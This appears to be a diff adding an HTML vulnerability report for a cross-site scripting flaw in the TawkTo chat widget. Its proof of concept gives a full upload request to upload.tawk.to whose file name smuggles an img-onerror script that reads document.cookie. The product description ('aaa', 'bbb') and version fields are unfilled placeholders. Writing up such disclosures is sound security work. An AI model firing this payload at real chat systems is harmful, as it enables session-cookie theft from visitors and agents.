@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Vulnerability in TawkTo Chatbot System</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 20px;
+        }
+        h1, h2, h3 {
+            color: #333;
+        }
+        .section {
+            margin-bottom: 20px;
+        }
+        code {
+            background-color: #f4f4f4;
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+    <h1>XSS Vulnerability in TawkTo Chatbot System</h1>
+
+    <div class="section">
+        <h2>Version Details</h2>
+        <p><strong>Version:</strong> TawkTo Version: </p>
+        <p><strong>Fixed Version:</strong> None</p>
+        <p><strong>CVE ID:</strong> None</p>
+        <p><strong>Vulnerability Type:</strong> Cross Site Scripting (XSS)</p>
+    </div>
+
+    <div class="section">
+        <h2>Description of the Product</h2>
+        <p>aaa</p>
+        <p>bbb</p>
+    </div>
+
+    <div class="section">
+        <h2>Description of the Vulnerability</h2>
+        <p> An XSS (Cross-Site Scripting) vulnerability exists. </p>
+    </div>
+
+    <div class="section">
+        <h2>Root Cause</h2>
+        <p>The causes of the XSS vulnerability stem from processing user input in a way that allows JavaScript execution. For example, if HTML encoding is not applied to input received from users, it should be implemented to prevent providing the browser’s JavaScript engine with tags capable of executing JavaScript.</p>
+        <p>Additionally, a whitelist should be created for attributes that allow JavaScript execution; otherwise, an attacker could inject and execute JavaScript code.</p>
+    </div>
+
+    <div class="section">
+        <h2>Proof of Concept (PoC)</h2>
+        
+        <br>
+
+<h3>Example HTTP Request</h1>
+<p><strong>POST</strong> /upload/visitor-chat/visitor?handle=7a1baa405db58160831b831850c72f7a87b45a87&visitorSessionId=6756b786ee771623a26739c7 <strong>HTTP/2</strong></p>
+<p><strong>Host</strong>: upload.tawk.to</p>
+<p><strong>Content-Length</strong>: 410</p>
+<p><strong>Sec-Ch-Ua-Platform</strong>: "Windows"</p>
+<p><strong>Accept-Language</strong>: en-US,en;q=0.9</p>
+<p><strong>Sec-Ch-Ua</strong>: "Not?A_Brand";v="99", "Chromium";v="130"</p>
+<p><strong>Content-Type</strong>: multipart/form-data; boundary=----WebKitFormBoundaryGo2POZxD45A3DT6J</p>
+<p><strong>Sec-Ch-Ua-Mobile</strong>: ?0</p>
+<p><strong>User-Agent</strong>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36</p>
+<p><strong>Accept</strong>: */*</p>
+<p><strong>Origin</strong>: https://cosmosofcyberspace.github.io</p>
+<p><strong>Sec-Fetch-Site</strong>: cross-site</p>
+<p><strong>Sec-Fetch-Mode</strong>: cors</p>
+<p><strong>Sec-Fetch-Dest</strong>: empty</p>
+<p><strong>Referer</strong>: https://cosmosofcyberspace.github.io/</p>
+<p><strong>Accept-Encoding</strong>: gzip, deflate, br</p>
+<p><strong>Priority</strong>: u=4, i</p>
+
+<pre>------WebKitFormBoundaryGo2POZxD45A3DT6J
+Content-Disposition: form-data; name="upload"; filename="'%22>img src=x onerror=alert(document.cookie)> copy 2.png"
+Content-Type: image/png
+
+PNG
+<png bytes>
+------WebKitFormBoundaryGo2POZxD45A3DT6J--</pre>
+
+
+<img src="resim_tawk_to.png"> </img>
+
+        
+    </div>
+
+    <div class="section">
+        <h2>Impact of XSS Vulnerabilities</h2>
+        <p>The actual impact of an XSS attack generally depends on the nature of the application, its functionality and data, and the status of the compromised user. For example:</p>
+        <ul>
+            <li>In a brochureware application, where all users are anonymous and all information is public, the impact will often be minimal.</li>
+            <li>In an application holding sensitive data, such as banking transactions, emails, or healthcare records, the impact will usually be serious.</li>
+            <li>If the compromised user has elevated privileges within the application, then the impact will generally be critical, allowing the attacker to take full control of the vulnerable application and compromise all users and their data.</li>
+        </ul>
+    </div>
+</body>
+</html>
